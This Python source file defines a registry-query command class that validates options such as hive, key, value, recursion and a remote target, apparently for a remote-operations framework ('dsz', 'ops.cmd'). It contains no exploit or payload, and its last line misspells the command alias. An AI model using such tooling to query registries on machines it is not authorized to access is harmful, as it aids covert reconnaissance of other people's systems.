
import ops.cmd
import dsz
from ops.cmd import OpsCommandException
VALID_OPTIONS = ['hive', 'key', 'value', 'recursive', 'target', 'wow64', 'wow32', 'chunksize']
HIVES = ['u', 'l', 'c', 'g', 'r']

class RegistryQueryCommand(ops.cmd.DszCommand, ):

    def __init__(self, plugin='registryquery', prefixes=[], arglist=None, dszquiet=True, hive='l', **optdict):
        ops.cmd.DszCommand.__init__(self, plugin=plugin, dszquiet=dszquiet, **optdict)
        self.hive = hive
        if ('key' in optdict):
            self.key = optdict['key']
        if ('value' in optdict):
            self.value = optdict['value']

    def _getHive(self):
        return self.optdict['hive']

    def _setHive(self, val):
        if (val is None):
            raise OpsCommandException('You must set hive, hive cannot be None')
        if (val.lower() in HIVES):
            self.optdict['hive'] = val.lower()
        else:
            raise OpsCommandException(('Invalid hive %s' % val))
    hive = property(_getHive, _setHive)

    def _getKey(self):
        if ('key' in self.optdict):
            return self.optdict['key']
        else:
            return None

    def _setKey(self, val):
        if ((val is None) or (val.strip() == '')):
            if ('key' in self.optdict):
                del self.optdict['key']
            return
        if ((val.find(' ') > (-1)) and (val[0] != '"')):
            val = ('"%s"' % val)
        if (val.find('""') > (-1)):
            val = val.replace('""', '"')
        self.optdict['key'] = val
    key = property(_getKey, _setKey)

    def _getValue(self):
        if ('value' in self.optdict):
            return self.optdict['value']
        else:
            return None

    def _setValue(self, val):
        if (val is None):
            if ('value' in self.optdict):
                del self.optdict['value']
            return
        if ((val.find(' ') > (-1)) and (val[0] != '"')):
            val = ('"%s"' % val)
        if (val.find('""') > (-1)):
            val = val.replace('""', '"')
        self.optdict['value'] = val
    value = property(_getValue, _setValue)

    def _getRecursive(self):
        if (('recursive' in self.optdict) and self.optdict['recursive']):
            return True
        else:
            return False

    def _setRecursive(self, val):
        if val:
            self.optdict['recursive'] = True
        elif ('recursive' in self.optdict):
            del self.optdict['recursive']
    recursive = property(_getRecursive, _setRecursive)

    def _getTarget(self):
        if ('target' in self.optdict):
            return self.optdict['target']
        else:
            return None

    def _setTarget(self, val):
        if (val is None):
            if ('target' in self.optdict):
                del self.optdict['target']
            return
        self.optdict['target'] = val
    target = property(_getTarget, _setTarget)

    def _getWow64(self):
        if (('wow64' in self.optdict) and self.optdict['wow64']):
            return True
        else:
            return False

    def _setWow64(self, val):
        if val:
            self.optdict['wow64'] = val
        elif ('wow64' in self.optdict):
            del self.optdict['wow64']
    wow64 = property(_getWow64, _setWow64)

    def _getWow32(self):
        if (('wow32' in self.optdict) and self.optdict['wow32']):
            return True
        else:
            return False

    def _setWow32(self, val):
        if val:
            self.optdict['wow32'] = val
        elif ('wow32' in self.optdict):
            del self.optdict['wow32']
    wow32 = property(_getWow32, _setWow32)

    def _getChunksize(self):
        if ('chunksize' in self.optdict):
            return self.optdict['chunksize']
        else:
            return None

    def _setChunksize(self, val):
        if (val is None):
            if ('chunksize' in self.optdict):
                del self.optdict['chunksize']
            return
        if (type(val) is int):
            self.optdict['chunksize'] = val
        else:
            raise OpsCommandException('chunksize is required to be an integer')
    chunksize = property(_getChunksize, _setChunksize)
ops.cmd.command_classes['registryquery'] = RegistryQueryCommand
ops.cmd.aliasoptions['registyquery'] = VALID_OPTIONS